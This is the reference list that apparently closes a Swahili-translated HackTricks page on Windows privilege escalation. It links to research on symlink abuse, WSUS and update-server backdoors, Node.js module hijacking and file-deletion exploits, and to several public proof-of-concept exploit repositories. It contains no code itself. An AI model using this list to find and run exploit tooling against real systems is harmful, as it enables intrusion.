- [16] [Zana za Kujaribu Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi Hatari wa Moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own pamoja na Microslop: Kuunganisha Masharti ya CLDFLT na DirectX Kernel Race kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja Kuwatawala Wote: Primitive Kamili ya Exploit ya Kusoma/Kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji wa Faili Holela ili Kupandisha Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya Siku ya Kwanza](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC ya CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya Picha Yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Sasisho za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Sasisho za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Kupandisha Privilege kwa Kufuta Folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
